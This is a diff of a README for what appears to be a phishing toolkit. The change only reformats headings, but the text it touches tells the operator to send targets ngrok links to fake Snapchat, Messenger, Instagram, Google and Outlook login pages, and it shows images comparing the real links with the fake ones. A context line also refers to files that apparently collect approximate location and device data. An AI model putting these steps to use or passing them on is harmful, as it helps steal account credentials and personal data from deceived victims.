@@ -68,35 +68,35 @@ chmod a+rwx ApproxLoc.txt && chmod 777 ApproxLoc.txt && chmod a+rwx device.txt &
 #
 **5.) Send A Link Replacing "YOUR_NGROK_LINK" With Your Unique Link (Highlighted In The Image Above)**
 #
-*SNAPCHAT:*
+# SNAPCHAT:
 #
 `YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Snapchat_Phisher/snapchat.html`
 #
 # Real One (Top) Server Link (Bottom)
 ![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/SnapchatLink.png)
 #
-*MESSENGER:*
+# MESSENGER:
 #
 `YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Snapchat_Phisher/messenger`
 #
 # Real One (Top) Server Link (Bottom)
 ![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/MessengerLink.png)
 #
-*INSTAGRAM:*
+# INSTAGRAM:
 #
 `YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Instagram_Phisher/instagram.html`
 #
 # Real One (Bottom) Server Link (Top)
 ![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/InstaLink.png)
 #
-*GOOGLE*
+# GOOGLE
 #
 `YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Google_Phisher/google.html`
 #
 # Real One (Bottom) Server Link (Top)
 ![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/Google_Link.png)
 #
-*OUTLOOK*
+# OUTLOOK
 #
 `YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Outlook_Phisher/outlook.html` 
 #
